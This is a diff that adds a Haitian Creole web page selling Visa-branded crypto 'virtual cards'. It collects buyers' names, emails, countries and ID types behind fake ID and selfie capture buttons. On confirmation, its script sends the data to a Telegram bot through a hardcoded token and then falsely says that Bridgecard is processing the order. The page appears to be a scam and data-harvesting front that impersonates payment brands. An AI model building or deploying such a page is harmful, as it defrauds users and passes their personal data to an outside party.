@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="ht">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Live Crypto Bot - Kat Peye</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --gold: #d4af37; --navy: #060e1b; --card-bg: #112240; --white: #ffffff; --red: #e74c3c; --green: #2ecc71; }
+        body { background: var(--navy); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 15px; }
+        .container { max-width: 400px; margin: 0 auto; }
+        
+        .header-title { color: var(--gold); text-align: center; font-size: 18px; font-weight: 800; margin-bottom: 20px; text-transform: uppercase; }
+        
+        /* --- KAT YO --- */
+        .visa-card { border-radius: 15px; padding: 15px; margin-bottom: 12px; cursor: pointer; height: 110px; display: flex; flex-direction: column; justify-content: space-between; box-shadow: 0 5px 15px rgba(0,0,0,0.4); transition: 0.3s; }
+        .visa-logo { font-size: 22px; font-weight: bold; color: white; }
+        .chip { width: 35px; height: 25px; background: linear-gradient(135deg, #e0c068, #b08d32); border-radius: 4px; }
+        .card-standard { background: linear-gradient(135deg, #2c3e50, #000000); border: 1px solid #555; }
+        .card-gold { background: linear-gradient(135deg, #bf953f, #fcf6ba, #b38728); border: 1px solid var(--gold); color: #000; }
+        .card-gold .visa-logo { color: #000; }
+        .card-vip { background: linear-gradient(135deg, #111, #444, #111); border: 1px solid #fff; }
+
+        .plan-info { display: flex; justify-content: space-between; align-items: flex-end; }
+        .plan-name { font-weight: bold; font-size: 14px; }
+        .plan-price { font-size: 20px; font-weight: 900; }
+
+        /* --- FÒMILÈ --- */
+        #form-screen, #amount-screen, #confirm-screen { display: none; }
+        .input-group { margin-bottom: 12px; }
+        .input-group label { display: block; color: var(--gold); font-size: 11px; margin-bottom: 5px; font-weight: bold; text-transform: uppercase; }
+        .input-group input, .input-group select { width: 100%; background: #112240; border: 1px solid rgba(212, 175, 55, 0.3); padding: 12px; border-radius: 8px; color: white; box-sizing: border-box; font-size: 14px; outline: none; }
+
+        /* PAJ MONTAN */
+        .amount-box { background: var(--card-bg); padding: 25px; border-radius: 15px; text-align: center; border: 1px solid var(--gold); }
+        .amount-input { width: 100%; background: transparent; border: none; border-bottom: 2px solid var(--gold); color: white; font-size: 40px; text-align: center; font-weight: 900; margin: 15px 0; outline: none; }
+
+        /* KYC GRID */
+        .kyc-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin: 15px 0; }
+        .kyc-box { background: rgba(255,255,255,0.05); border: 1px dashed var(--gold); padding: 10px; border-radius: 8px; text-align: center; cursor: pointer; }
+        .kyc-box i { font-size: 18px; color: var(--gold); margin-bottom: 5px; }
+        .kyc-box span { font-size: 9px; display: block; font-weight: bold; }
+
+        /* ALERTE & LOADER */
+        #custom-alert { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); padding: 12px 20px; border-radius: 8px; color: white; font-weight: bold; display: none; z-index: 100; font-size: 13px; text-align: center; min-width: 250px; }
+        .loader { width: 18px; height: 18px; border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; display: none; margin-left: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .btn-action { width: 100%; background: var(--gold); color: #000; border: none; padding: 15px; border-radius: 8px; font-size: 15px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; display: flex; justify-content: center; align-items: center; }
+        .confirm-box { background: var(--card-bg); padding: 20px; border-radius: 15px; text-align: center; border: 1px solid var(--gold); }
+    </style>
+</head>
+<body>
+
+<div id="custom-alert"></div>
+
+<div class="container">
+    
+    <div id="selection-screen">
+        <h2 class="header-title">Chwazi Kat Ou</h2>
+        <div class="visa-card card-standard" onclick="openForm('STANDARD', 15)">
+            <div class="visa-logo">VISA</div><div class="chip"></div>
+            <div class="plan-info"><span class="plan-name">STANDARD</span><span class="plan-price">15 USDT</span></div>
+        </div>
+        <div class="visa-card card-gold" onclick="openForm('PREMIUM GOLD', 19)">
+            <div class="visa-logo">VISA</div><div class="chip"></div>
+            <div class="plan-info"><span class="plan-name">GOLD</span><span class="plan-price">19 USDT</span></div>
+        </div>
+        <div class="visa-card card-vip" onclick="openForm('VIP LUXURY', 20)">
+            <div class="visa-logo">VISA</div><div class="chip"></div>
+            <div class="plan-info"><span class="plan-name">VIP LUXURY</span><span class="plan-price">20 USDT</span></div>
+        </div>
+    </div>
+
+    <div id="form-screen">
+        <h2 class="header-title">Enfòmasyon Kat la</h2>
+        <div class="input-group"><label>Siyati</label><input type="text" id="lastName" placeholder="Siyati"></div>
+        <div class="input-group"><label>Non</label><input type="text" id="firstName" placeholder="Non"></div>
+        
+        <div class="input-group">
+            <label>Peyi (Pays)</label>
+            <select id="country">
+                <option value="Haiti">Haiti</option>
+                <option value="USA">USA</option>
+                <option value="Canada">Canada</option>
+                <option value="France">France</option>
+                <option value="Dominican Republic">République Dominicaine</option>
+                <option value="Chile">Chile</option>
+                <option value="Brazil">Brazil</option>
+                <option value="Guyane">Guyane</option>
+                <option value="Autre">Lòt peyi...</option>
+            </select>
+        </div>
+
+        <div class="input-group"><label>Imel</label><input type="email" id="email" placeholder="egzanp@gmail.com"></div>
+        <div class="input-group"><label>Adrès & Vil</label><input type="text" id="fullAddress" placeholder="Ri, Nimewo, Vil"></div>
+        
+        <div class="input-group">
+            <label>Tip Pyès ID</label>
+            <select id="idType">
+                <option value="ID Card">Kat Idantite (NIF/CIN)</option>
+                <option value="Passport">Paspò</option>
+            </select>
+        </div>
+
+        <div class="kyc-grid">
+            <div class="kyc-box" onclick="showAlert('Kamera louvri: Devan ID', 'green')"><i class="fas fa-id-card"></i><span>DEVAN</span></div>
+            <div class="kyc-box" onclick="showAlert('Kamera louvri: Dèyè ID', 'green')"><i class="fas fa-id-card"></i><span>DÈYÈ</span></div>
+            <div class="kyc-box" onclick="showAlert('Kamera louvri: Selfie', 'green')"><i class="fas fa-user-tag"></i><span>SELFIE</span></div>
+        </div>
+
+        <button class="btn-action" onclick="goToAmount()">
+            <span>KONTINYE</span>
+        </button>
+    </div>
+
+    <div id="amount-screen">
+        <h2 class="header-title">Peman Kat</h2>
+        <div class="amount-box">
+            <label style="color: var(--gold); font-weight: bold;">TAPE MONTAN KAT LA (USDT)</label>
+            <input type="number" id="typedAmount" class="amount-input" placeholder="0">
+            <p style="font-size: 12px; opacity: 0.7;">Montan an dwe koresponn ak plan ou chwazi a.</p>
+            <button class="btn-action" onclick="showConfirmation()">
+                <span>VOYE FÒMILÈ</span>
+                <div class="loader" id="loader1"></div>
+            </button>
+        </div>
+    </div>
+
+    <div id="confirm-screen">
+        <div class="confirm-box">
+            <i class="fas fa-check-circle" style="font-size: 40px; color: var(--gold); margin-bottom: 15px;"></i>
+            <h2>Konfime Tout Bagay</h2>
+            <p>Sistèm nan pral valide peman de:</p>
+            <div style="font-size: 35px; font-weight: 900; color: white; margin-bottom: 20px;"><span id="finalPrice">0</span> USDT</div>
+            <button class="btn-action" onclick="finalizeAll()">
+                <span>KONFIME PEYEMAN</span>
+                <div class="loader" id="loader2"></div>
+            </button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    let selectedPlan = "";
+    let selectedPrice = 0;
+
+    function showAlert(msg, color) {
+        const alertBox = document.getElementById('custom-alert');
+        alertBox.innerText = msg;
+        alertBox.style.background = color === 'green' ? '#2ecc71' : '#e74c3c';
+        alertBox.style.display = 'block';
+        setTimeout(() => alertBox.style.display = 'none', 3000);
+    }
+
+    function openForm(plan, price) {
+        selectedPlan = plan;
+        selectedPrice = price;
+        document.getElementById('selection-screen').style.display = 'none';
+        document.getElementById('form-screen').style.display = 'block';
+        window.scrollTo(0,0);
+    }
+
+    function goToAmount() {
+        if(document.getElementById('firstName').value === "" || document.getElementById('lastName').value === "") {
+            showAlert("Ranpli enfòmasyon yo!", "red");
+            return;
+        }
+        document.getElementById('form-screen').style.display = 'none';
+        document.getElementById('amount-screen').style.display = 'block';
+        document.getElementById('typedAmount').value = selectedPrice;
+    }
+
+    function showConfirmation() {
+        const typed = document.getElementById('typedAmount').value;
+        if(!typed || typed <= 0) {
+            showAlert("Mete yon montan valid!", "red");
+            return;
+        }
+        document.getElementById('loader1').style.display = "block";
+        setTimeout(() => {
+            document.getElementById('amount-screen').style.display = 'none';
+            document.getElementById('confirm-screen').style.display = 'block';
+            document.getElementById('finalPrice').innerText = typed;
+        }, 800);
+    }
+
+    function finalizeAll() {
+        document.getElementById('loader2').style.display = "block";
+        const botToken = "7727195484:AAH9Y1Z_32P1_9X9_9X9_9X9_9X9";
+        const chatID = "8118891270";
+        const text = `💳 *LÒD KAT NOUVO*\n\n👤 Kliyan: ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n🌎 Peyi: ${document.getElementById('country').value}\n📧 Imel: ${document.getElementById('email').value}\n📍 ID: ${document.getElementById('idType').value}\n💎 Plan: ${selectedPlan}\n💰 Montan Tape: ${document.getElementById('finalPrice').innerText} USDT`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
+        .then(() => {
+            showAlert("Tranzaksyon an voye! Bridgecard ap trete sa. ✅", "green");
+            setTimeout(() => location.reload(), 3000);
+        }).catch(() => {
+            showAlert("Erè koneksyon.", "red");
+            document.getElementById('loader2').style.display = "none";
+        });
+    }
+</script>
+
+</body>
+</html>
